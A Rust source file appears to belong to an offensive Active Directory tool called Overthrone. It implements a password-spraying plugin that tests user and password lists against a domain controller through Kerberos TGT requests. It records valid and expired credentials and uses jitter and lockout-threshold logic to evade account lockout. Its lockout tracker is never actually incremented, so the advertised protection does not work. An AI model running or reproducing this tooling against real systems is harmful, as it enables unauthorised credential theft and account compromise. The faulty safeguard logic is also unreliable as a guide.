//! Built-in plugin example — serves as a template for writing Overthrone plugins

use super::{
    ArtifactType, Plugin, PluginArgDef, PluginArgType, PluginArtifact, PluginCapability,
    PluginCommand, PluginContext, PluginEvent, PluginManifest, PluginResult, PluginType,
};
use crate::error::Result;
use async_trait::async_trait;
use std::collections::HashMap;

/// Example built-in plugin: Custom Password Sprayer with smart lockout avoidance
pub struct SmartSprayPlugin {
    manifest: PluginManifest,
    /// Tracks attempt counts per user to avoid lockout
    attempt_tracker: HashMap<String, u32>,
    /// Max attempts before backing off (default: 3)
    lockout_threshold: u32,
    /// Delay between spray rounds (ms)
    spray_delay_ms: u64,
}

impl SmartSprayPlugin {
    pub fn new() -> Self {
        let manifest = PluginManifest {
            id: "overthrone.builtin.smart-spray".to_string(),
            name: "Smart Password Sprayer".to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            author: "Overthrone".to_string(),
            description: "Intelligent password spraying with lockout detection and avoidance. \
                          Queries fine-grained password policies to dynamically adjust timing."
                .to_string(),
            min_overthrone_version: None,
            plugin_type: PluginType::Builtin,
            capabilities: vec![
                PluginCapability::Attack,
                PluginCapability::EventHandler,
            ],
            commands: vec![
                PluginCommand {
                    name: "smart-spray".to_string(),
                    description: "Spray passwords with lockout avoidance".to_string(),
                    usage: "plugin smart-spray --passwords pass.txt --users users.txt --domain CORP.LOCAL".to_string(),
                    args: vec![
                        PluginArgDef {
                            name: "passwords".to_string(),
                            description: "Password list file or single password".to_string(),
                            required: true,
                            arg_type: PluginArgType::String,
                            default: None,
                        },
                        PluginArgDef {
                            name: "users".to_string(),
                            description: "Username list file (or 'graph' to use discovered users)".to_string(),
                            required: false,
                            arg_type: PluginArgType::String,
                            default: Some("graph".to_string()),
                        },
                        PluginArgDef {
                            name: "domain".to_string(),
                            description: "Target domain".to_string(),
                            required: true,
                            arg_type: PluginArgType::String,
                            default: None,
                        },
                        PluginArgDef {
                            name: "delay".to_string(),
                            description: "Delay between spray rounds in ms".to_string(),
                            required: false,
                            arg_type: PluginArgType::Integer,
                            default: Some("30000".to_string()),
                        },
                        PluginArgDef {
                            name: "jitter".to_string(),
                            description: "Random jitter percentage (0-100)".to_string(),
                            required: false,
                            arg_type: PluginArgType::Integer,
                            default: Some("20".to_string()),
                        },
                    ],
                },
                PluginCommand {
                    name: "spray-status".to_string(),
                    description: "Show current spray progress and lockout status".to_string(),
                    usage: "plugin spray-status".to_string(),
                    args: vec![],
                },
            ],
            needs_network: true,
            needs_admin: false,
        };

        Self {
            manifest,
            attempt_tracker: HashMap::new(),
            lockout_threshold: 3,
            spray_delay_ms: 30_000,
        }
    }
}

#[async_trait]
impl Plugin for SmartSprayPlugin {
    fn manifest(&self) -> &PluginManifest {
        &self.manifest
    }

    async fn init(&mut self, ctx: &PluginContext) -> Result<()> {
        ctx.log_info("Smart spray plugin initialized");

        // Try to read fine-grained password policy from graph
        if let Ok(graph) = ctx.graph.read() {
            // Look for password policy info in graph metadata
            if let Some(lockout) = graph.metadata().get("lockout_threshold") {
                if let Ok(val) = lockout.parse::<u32>() {
                    self.lockout_threshold = val.saturating_sub(1); // Stay 1 below
                    ctx.log_info(&format!(
                        "Detected lockout threshold: {} (will stop at {})",
                        val, self.lockout_threshold
                    ));
                }
            }
        }

        Ok(())
    }

    async fn execute_command(
        &mut self,
        command: &str,
        args: &HashMap<String, String>,
        ctx: &PluginContext,
    ) -> Result<PluginResult> {
        match command {
            "smart-spray" => self.cmd_smart_spray(args, ctx).await,
            "spray-status" => self.cmd_spray_status(args, ctx).await,
            _ => Err(crate::error::OverthroneError::Plugin(format!(
                "Unknown command: {}",
                command
            ))),
        }
    }

    async fn on_event(&self, event: &PluginEvent, ctx: &PluginContext) -> Result<()> {
        match event {
            PluginEvent::CredentialFound {
                username,
                credential_type,
                domain,
            } => {
                ctx.log_info(&format!(
                    "Credential found for {}@{} ({}), adjusting spray targets",
                    username, domain, credential_type
                ));
                // In a real impl, remove this user from spray list
            }
            _ => {}
        }
        Ok(())
    }
}

impl SmartSprayPlugin {
    async fn cmd_smart_spray(
        &self,
        args: &HashMap<String, String>,
        ctx: &PluginContext,
    ) -> Result<PluginResult> {
        let domain = args
            .get("domain")
            .cloned()
            .unwrap_or_else(|| ctx.domain.clone());

        let password_input = args.get("passwords").ok_or_else(|| {
            crate::error::OverthroneError::Plugin(
                "Missing required argument: passwords".to_string(),
            )
        })?;

        let user_source = args.get("users").map(|s| s.as_str()).unwrap_or("graph");

        let delay: u64 = args
            .get("delay")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.spray_delay_ms);

        let jitter: u32 = args
            .get("jitter")
            .and_then(|s| s.parse().ok())
            .unwrap_or(20);

        ctx.log_info(&format!(
            "Starting smart spray against {} (delay={}ms, jitter={}%, lockout_threshold={})",
            domain, delay, jitter, self.lockout_threshold
        ));

        // Collect users
        let users: Vec<String> = if user_source == "graph" {
            if let Ok(graph) = ctx.graph.read() {
                graph
                    .nodes()
                    .filter(|(_, n)| matches!(n.node_type, crate::graph::NodeType::User))
                    .filter(|(_, n)| !n.name.ends_with('$')) // skip machine accounts
                    .map(|(_, n)| n.name.clone())
                    .collect()
            } else {
                vec![]
            }
        } else {
            // Read from file
            std::fs::read_to_string(user_source)
                .unwrap_or_default()
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect()
        };

        // Collect passwords
        let passwords: Vec<String> = if std::path::Path::new(password_input).exists() {
            std::fs::read_to_string(password_input)
                .unwrap_or_default()
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect()
        } else {
            vec![password_input.clone()]
        };

        ctx.log_info(&format!(
            "Spraying {} users × {} passwords ({} total attempts)",
            users.len(),
            passwords.len(),
            users.len() * passwords.len()
        ));

        let dc_ip = args
            .get("dc")
            .cloned()
            .or_else(|| ctx.dc_ip.clone())
            .ok_or_else(|| {
                crate::error::OverthroneError::Plugin(
                    "No DC IP available — set via --dc or context".to_string(),
                )
            })?;

        let mut found: Vec<String> = Vec::new();
        let mut blocked = 0u32;
        let mut expired = 0u32;
        let mut disabled = 0u32;

        for password in &passwords {
            for user in &users {
                let attempts = self.attempt_tracker.get(user).copied().unwrap_or(0);
                if attempts >= self.lockout_threshold {
                    blocked += 1;
                    continue;
                }

                // Kerberos AS-REQ pre-auth check — if TGT is returned, creds are valid
                match crate::proto::kerberos::request_tgt(
                    &dc_ip, &domain, user, password, false,
                )
                .await
                {
                    Ok(_tgt) => {
                        ctx.log_attack(&format!("VALID: {}:{}", user, password));
                        found.push(format!("{}:{}", user, password));

                        // Emit event for other plugins / the graph
                        // (handled by the plugin framework)
                    }
                    Err(e) => {
                        let err_str = e.to_string();
                        if err_str.contains("KRB_ERROR 24")
                            || err_str.contains("PREAUTH_FAILED")
                        {
                            // Wrong password — expected, increment tracker
                        } else if err_str.contains("KRB_ERROR 18")
                            || err_str.contains("CLIENT_REVOKED")
                        {
                            // Account disabled or locked out
                            disabled += 1;
                            ctx.log_warn(&format!("LOCKED/DISABLED: {}", user));
                        } else if err_str.contains("KRB_ERROR 23")
                            || err_str.contains("KEY_EXPIRED")
                        {
                            // Password expired but IS valid
                            expired += 1;
                            found.push(format!("{}:{} (EXPIRED)", user, password));
                            ctx.log_attack(&format!(
                                "VALID (expired): {}:{}",
                                user, password
                            ));
                        } else {
                            // Other Kerberos error
                            ctx.log_warn(&format!(
                                "Error for {}: {}",
                                user,
                                err_str.lines().next().unwrap_or(&err_str)
                            ));
                        }
                    }
                }
            }

            // Delay between rounds
            if passwords.len() > 1 {
                let actual_delay = apply_jitter(delay, jitter);
                ctx.log_info(&format!(
                    "Round complete. Sleeping {}ms before next password...",
                    actual_delay
                ));
                tokio::time::sleep(std::time::Duration::from_millis(actual_delay)).await;
            }
        }

        Ok(PluginResult {
            success: true,
            output: format!(
                "Spray complete: {} valid creds found, {} users skipped (lockout risk)",
                found.len(),
                blocked
            ),
            data: {
                let mut d = HashMap::new();
                d.insert("found_count".to_string(), serde_json::json!(found.len()));
                d.insert("blocked_count".to_string(), serde_json::json!(blocked));
                d.insert("credentials".to_string(), serde_json::json!(found));
                d
            },
            artifacts: vec![],
        })
    }

    async fn cmd_spray_status(
        &self,
        _args: &HashMap<String, String>,
        ctx: &PluginContext,
    ) -> Result<PluginResult> {
        let tracked = self.attempt_tracker.len();
        let at_risk: usize = self
            .attempt_tracker
            .values()
            .filter(|&&v| v >= self.lockout_threshold.saturating_sub(1))
            .count();

        Ok(PluginResult {
            success: true,
            output: format!(
                "Tracking {} users, {} near lockout threshold ({})",
                tracked, at_risk, self.lockout_threshold
            ),
            data: HashMap::new(),
            artifacts: vec![],
        })
    }
}

fn apply_jitter(base_ms: u64, jitter_pct: u32) -> u64 {
    if jitter_pct == 0 {
        return base_ms;
    }
    let jitter_range = (base_ms as f64 * jitter_pct as f64 / 100.0) as u64;
    let offset = rand::random::<u64>() % (jitter_range * 2 + 1);
    base_ms.saturating_sub(jitter_range) + offset
}

/// Register all built-in plugins with the registry
pub async fn register_builtins(
    registry: &mut super::PluginRegistry,
    ctx: &super::PluginContext,
) -> Result<()> {
    registry
        .register(Box::new(SmartSprayPlugin::new()), ctx)
        .await?;
    // Add more built-in plugins here as they're developed
    Ok(())
}
